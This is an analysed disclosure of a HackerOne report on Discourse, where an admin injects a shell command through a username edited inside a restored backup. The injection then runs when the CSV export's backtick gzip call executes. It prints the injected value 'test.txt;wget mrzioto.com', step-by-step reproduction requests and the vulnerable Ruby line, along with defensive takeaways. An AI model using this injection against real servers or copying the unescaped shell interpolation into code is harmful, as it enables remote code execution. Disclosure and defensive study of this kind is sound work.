# Admin Command Injection via Username in user_archive ExportCsvFile

## Metadata
- **Source:** HackerOne
- **Report:** 214022 | https://hackerone.com/reports/214022
- **Submitted:** 2017-03-16
- **Reporter:** ziot
- **Program:** Discourse
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** Command Injection, Insufficient Input Validation, Privilege Escalation
- **CVEs:** None
- **Category:** memory-binary

## Summary
An attacker with admin privileges can modify usernames in database backups to inject shell metacharacters, bypassing client-side username restrictions. When a compromised backup is restored, the injected username is unsanitized and directly embedded in a shell gzip command executed via backticks, resulting in arbitrary command execution.

## Attack scenario
1. Attacker logs in as admin and downloads a backup of the website
2. Attacker extracts the backup archive and modifies a username field in the database dump (e.g., to 'test.txt;wget mrzioto.com')
3. Attacker repackages the archive and uploads it as a restore point
4. System processes the restore, inserting the malicious username into the database without sanitization
5. Attacker logs in using email (bypassing username character validation) and triggers CSV export via POST request
6. The unsanitized username is embedded in backtick-executed gzip command, executing injected shell commands with server privileges

## Root cause
The application performs client-side username validation to prevent special characters but fails to validate usernames during database restore operations. Subsequently, usernames are directly interpolated into shell commands via backticks without escaping or parameterization, allowing command injection when special characters are present.

## Attacker mindset
Privilege escalation through backup manipulation—if an admin account is compromised or accessible, the attacker leverages the trust placed in backup/restore functionality to bypass input validation controls and achieve RCE by injecting commands into fields that feed directly into OS-level operations.

## Defensive takeaways
- Never use backticks or system() for shell execution; use parameterized APIs (e.g., Kernel.system with array arguments, or library functions like gzip bindings)
- Apply consistent input validation on all data sources, including database restore operations—server-side modifications must be subject to the same constraints as client input
- Implement server-side validation of usernames regardless of origin (UI, API, or backup restoration)
- Use allowlists for usernames rather than blocklists for special characters
- Sanitize or escape all variables before embedding in shell commands, or better yet, avoid shell execution entirely
- Audit backup and restore code paths for injection vectors, treating restored data as potentially untrusted
- Implement strong access controls on backup/restore functionality to limit exposure of this privilege escalation vector

## Variant hunting
Search for other backtick or system() calls that use user-controlled fields (email, display name, custom fields)
Check if other export functions (user archives, post exports, etc.) use similar unsafe command construction patterns
Audit restore/import functionality across the application for similar validation bypasses
Look for any CSV export or file generation that pipes usernames into shell commands
Examine admin-only database modification endpoints for similar interpolation vulnerabilities

## MITRE ATT&CK
- T1190
- T1059
- T1098
- T1548

## Notes
This is a classic case where multiple layers of security failed: client-side validation is insufficient, restore operations bypassed validation, and the final code path used unsafe shell execution. The attack required admin access but resulted in RCE, making it a privilege escalation vector. The vulnerability highlights the danger of mixing application-level validation with OS-level command execution without parameterization.

## Full report
<details><summary>Expand</summary>

When a user generates a backup of their posts, their username gets sent to the `ExportCsvFile` job. The username is placed inside of a gzip command in backticks. Although the application prevents special characters in usernames, an admin is able to make modifications to the database via the restore from backup feature. This allows an admin to escalate to command injection.

## Steps

 1. Login as an admin on try.discourse.org, e.g.
  * http://try.discourse.org/
 2. Make a backup of the website and download it.
 3. Extract the contents of the archive.
 4. Modify one of the usernames of an account you have access to:
  * test.txt;wget mrzioto.com
 5. Repackage the archive.
 6. Upload the modified archive.
 7. Restore from backup.
 8. Log into the account you just modified (you can login via email address, so the special characters won't prevent you from logging into it).
 9. Send the POST request for creating a user export archive:
  * http://34.205.246.2/export_csv/export_entity.json
  * POST: entity_type=user&entity=user_archive
 10. ---> You forced the server to make a wget leading to RCE/command injection.

## Code Flow

```
      file_name_prefix = if @entity == "user_archive"
        "#{@entity.split('_').join('-')}-#{@current_user.username}-#{Time.now.strftime("%y%m%d-%H%M%S")}"

      file_name = "#{file_name_prefix}-#{file.id}.csv"
      absolute_path = "#{UserExport.base_directory}/#{file_name}"

      `gzip -5 #{absolute_path}`
```

</details>

---
*Analysed by Claude on 2026-05-24*
